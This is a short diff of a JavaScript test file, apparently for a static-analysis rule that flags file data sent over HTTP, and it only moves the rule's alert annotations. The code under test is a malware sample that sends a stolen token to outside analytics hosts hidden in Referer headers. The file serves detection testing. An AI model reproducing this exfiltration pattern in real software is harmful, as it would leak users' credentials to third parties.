@@ -15,14 +15,14 @@ try {
           hostname: "sstatic1.histats.com",
           path: "/0.gif?4103075&101",
           method: "GET",
-          headers: { Referer: "http://1.a/" + content } // $ Alert - passing stolen token in a  header
-        }, () => { })
+          headers: { Referer: "http://1.a/" + content } // passing stolen token in a  header
+        }, () => { }) // $ Alert[js/file-access-to-http]
         https1.get({
           hostname: "c.statcounter.com",
           path: "/11760461/0/7b5b9d71/1/",
           method: "GET",
-          headers: { Referer: "http://2.b/" + content } // $ Alert - passing stolen token in a  header
-        }, () => { })
+          headers: { Referer: "http://2.b/" + content } // passing stolen token in a  header
+        }, () => { }) // $ Alert[js/file-access-to-http]
       });
     });
   }
